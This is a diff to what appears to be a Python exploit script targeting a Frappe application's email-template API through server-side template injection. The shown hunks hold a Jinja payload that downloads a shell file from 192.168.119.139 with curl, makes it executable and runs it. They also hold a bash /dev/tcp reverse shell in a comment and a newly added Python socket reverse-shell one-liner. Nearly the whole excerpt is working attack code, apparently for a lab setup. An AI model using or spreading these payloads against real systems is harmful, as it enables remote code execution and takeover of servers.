@@ -108,6 +108,7 @@ def create_email_template(session, url, user, template_name, ssti,proxies=None):
 
 # fully working rce => reverse shell
 # contents of shell: /bin/bash -i >& /dev/tcp/192.168.119.139/4444 0>&1
+# this also includes a one liner via python
 '''
 {% set string = "ssti" %}
 {% set class = "__class__" %}
@@ -121,8 +122,9 @@ def create_email_template(session, url, user, template_name, ssti,proxies=None):
 {{ x(["/usr/bin/curl" ,"http://192.168.119.139/jinja-ssti-test-env/shell", "-o", "/tmp/simpdaddy"]) }}
 {{ x(["/bin/chmod" ,"+x", "/tmp/simpdaddy"]) }}
 {{ x(["/bin/bash","-c","/tmp/simpdaddy"]) }}
+{{ x(["/usr/bin/python3","-c","import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('192.168.119.139',4445));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn('/bin/bash')"]) }}
 {% endif %}
-{% endfor %}  
+{% endfor %}
 '''
 def trigger_ssti_email_template(session, url, template_name, user, ssti, proxies=None):
     url += 'api/method/frappe.email.doctype.email_template.email_template.get_email_template'
